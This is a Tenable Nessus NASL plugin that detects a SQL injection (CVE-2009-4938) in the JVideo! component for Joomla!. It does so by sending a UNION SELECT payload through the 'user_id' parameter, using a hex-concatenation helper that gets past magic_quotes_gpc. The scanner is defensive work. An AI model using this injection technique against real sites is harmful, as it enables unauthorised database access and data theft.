#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(38974);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2009-4938");
  script_bugtraq_id(35146);
  script_osvdb_id(66477);
  script_xref(name:"EDB-ID", value:"8821");

  script_name(english:"JVideo! Component for Joomla! 'user_id' Parameter SQLi");
  script_summary(english:"Attempts to manipulate a SQL query.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the JVideo! component for Joomla! running on the remote
host is affected by a SQL injection vulnerability in the
models/user.php script due to improper sanitization of user-supplied
input to the 'user_id' parameter before using it to construct database
queries in the getUsername() function. Regardless of the PHP
'magic_quotes_gpc' setting, an unauthenticated, remote attacker can
exploit this issue to manipulate database queries, resulting in
disclosure of sensitive information, modification of data, or other
attacks against the underlying database.");
  # https://web.archive.org/web/20100106162443/http://jvideo.infinovision.com/changelog
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?15208d0e");
  script_set_attribute(attribute:"solution", value:
"Upgrade to JVideo! version 0.5.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/05/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/06/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "JVideo!";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('JVideo!', 'JVideoAJAX');
  checks["/components/com_jvideo/assets/js/jvideoajax.js"]=regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}

test_script = SCRIPT_NAME - ".nasl";

# Try to exploit the issue to manipulate a "user" profile.
exploit = rand() % 1000 + " AND 1=2 UNION SELECT " + hexify(str:test_script);

url = "/index.php?option=com_jvideo&view=user&user_id=" + urlencode(str:exploit);

res = http_send_recv3(method:"GET", item:dir+url, port:port, exit_on_fail:TRUE);

# There's a problem if...
if (
  # it looks like JVideo and...
  'div class="jvideo_' >< res[2] &&
  # we see our magic as a profile.
  test_script + "'s Profile" >< res[2]
)
{
  output = strstr(res[2], test_script);
  if (empty_or_null(output)) output = res[2];

  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    sqli       : TRUE,  # Sets SQLInjection KB key
    request    : make_list(install_url +url),
    output     : chomp(output)
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
